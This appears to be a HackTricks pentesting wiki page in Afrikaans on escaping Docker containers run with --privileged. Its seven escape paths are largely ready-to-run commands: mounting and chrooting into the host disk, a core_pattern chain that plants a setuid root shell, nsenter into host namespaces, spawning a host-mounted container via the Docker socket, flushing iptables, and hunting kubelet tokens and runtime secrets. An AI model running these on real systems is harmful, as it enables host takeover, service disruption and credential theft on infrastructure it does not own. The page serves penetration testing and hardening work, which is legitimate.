# Ontsnap uit `--privileged` Containers

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

'n container wat met `--privileged` begin is nie dieselfde as 'n normale container met een of twee ekstra permissies nie. In praktyk verwyder of verswak `--privileged` verskeie van die standaard runtime-beskermings wat gewoonlik die werkbelasting weg van gevaarlike gasheer-hulpbronne hou. Die presiese effek hang steeds af van die runtime en gasheer, maar vir Docker is die algemene resultaat:

- alle capabilities word toegeken
- die device cgroup-beperkings word opgehef
- baie kernel-lêerstelsels hou op om as slegs-lees gemonteer te wees
- standaard gemaskerde procfs-paaie verdwyn
- seccomp-filtrering is gedeaktiveer
- AppArmor-inperking is gedeaktiveer
- SELinux-isolasie is gedeaktiveer of vervang met 'n veel breër etiket

Die belangrike gevolg is dat 'n privileged container gewoonlik nie 'n subtiele kernel-exploit benodig nie. In baie gevalle kan dit eenvoudig met gasheer-toestelle, gasheer-gesigte kernel-lêerstelsels, of runtime-koppelvlakke direk kommunikeer en dan na 'n gasheer-shell draai.

## Wat `--privileged` Nie Outomaties Verander Nie

`--privileged` sluit nie outomaties by die gasheer PID-, network-, IPC- of UTS-namespaces aan nie. 'n privileged container kan steeds privaat namespaces hê. Dit beteken sommige ontsnappingskettings vereis 'n ekstra voorwaarde soos:

- 'n host bind mount
- host PID-deling
- host networking
- sigbare host-toestelle
- skryfbare proc/sys-interfaces

Daardie voorwaardes is dikwels maklik om te bevredig in werklike verkeerde konfigurasies, maar hulle is konseptueel apart van `--privileged` self.

## Ontsnappade

### 1. Monteer die gasheer-disk deur blootgestelde toestelle

'n privileged container sien gewoonlik baie meer device nodes onder `/dev`. As die gasheer block device sigbaar is, is die eenvoudigste ontsnapping om dit te mount en met `chroot` in die gasheer-lêerstelsel in te gaan:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
As die root partition nie duidelik is nie, enumereer eers die block layout:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
As die praktiese pad is om 'n setuid helper in 'n skryfbare gasheer-mount te plant in plaas van om te `chroot`, onthou dat nie elke lêerstelsel die setuid-bit eerbiedig nie. 'n Vinnige gasheer-kant vermoëkontrole is:
```bash
mount | grep -v "nosuid"
```
Dit is nuttig omdat skryfbare paaie onder `nosuid` filesisteme veel minder interessant is vir klassieke "drop a setuid shell and execute it later" werkvloei.

Die verswakte beskermings wat hier misbruik word, is:

- volledige toestelblootstelling
- breë capabilities, veral `CAP_SYS_ADMIN`

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Monteer of hergebruik 'n host bind mount en `chroot`

As die host root filesystem reeds binne die konteneur gemonteer is, of as die konteneur die nodige mounts kan skep omdat dit privileged is, is 'n host shell dikwels net een `chroot` weg:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Indien daar geen host root bind mount bestaan nie, maar host storage bereikbaar is, skep een:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Hierdie pad misbruik:

- verswakte mount-beperkings
- volle capabilities
- gebrek aan MAC-afbakening

Verwante bladsye:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Misbruik skryfbare `/proc/sys` of `/sys`

Een van die groot gevolge van `--privileged` is dat procfs- en sysfs-beskermings baie swakker word. Dit kan host-gerigte kernel-koppelvlakke blootstel wat normaalweg gemaskeer of as read-only gemonteer is.

’n klassieke voorbeeld is `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Ander paaie met hoë waarde sluit in:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Hierdie pad misbruik:

- ontbrekende gemaskerde paaie
- ontbrekende stelselpaaie wat net-lees is

Related pages:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Gebruik volle capabilities vir mount- of namespace-gebaseerde ontsnapping

'n bevoorregte container kry die capabilities wat normaalweg uit standaard-containers verwyder word, insluitend `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN`, en baie ander. Dit is dikwels genoeg om 'n plaaslike voetjie in 'n host-ontsnapping te omskep sodra 'n ander blootgestelde oppervlak bestaan.

'n eenvoudige voorbeeld is om bykomende lêerstelsels te mount en namespace entry te gebruik:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
As host PID ook gedeel word, word die stap selfs korter:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Hierdie pad misbruik:

- die verstek privileged capability set
- opsionele host PID sharing

Verwante bladsye:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Escape Through Runtime Sockets

'n privileged container beland dikwels met host runtime state of sockets wat sigbaar is. As 'n Docker-, containerd- of CRI-O-socket bereikbaar is, is die eenvoudigste benadering dikwels om die runtime API te gebruik om 'n tweede container met host access te loods:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Vir containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Hierdie pad misbruik:

- privileged runtime exposure
- host bind mounts created through the runtime itself

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Verwyder newe-effekte van netwerkisolering

`--privileged` sluit op sigself nie by die host network namespace aan nie, maar as die container ook `--network=host` of ander host-network toegang het, raak die volledige network stack veranderbaar:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Dit is nie altyd 'n direkte host-shell nie, maar dit kan lei tot denial of service, verkeersafluistering, of toegang tot slegs-loopback bestuursdienste.

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Lees Host-sekrete en runtime-toestand

Selfs wanneer 'n skoon shell-escape nie onmiddellik beskikbaar is nie, het privileged containers dikwels genoeg toegang om host-sekrete, kubelet state, runtime metadata, en naburige container filesystems te lees:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
As `/var` host-mounted is of die runtime directories sigbaar is, kan dit genoeg wees vir lateral movement of cloud/Kubernetes credential theft selfs voordat 'n host shell verkry is.

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Kontroles

Die doel van die volgende opdragte is om te bevestig watter privileged-container escape families onmiddellik lewensvatbaar is.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Wat hier interessant is:

- 'n volledige capability set, veral `CAP_SYS_ADMIN`
- skryfbare proc/sys-blootstelling
- sigbare host-toestelle
- ontbrekende seccomp- en MAC-confinement
- runtime sockets of host root bind mounts

Enigeen van dié kan genoeg wees vir post-exploitation. Verskeie saam beteken gewoonlik dat die container funksioneel een of twee commands van host compromise af is.

## Verwante bladsye

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
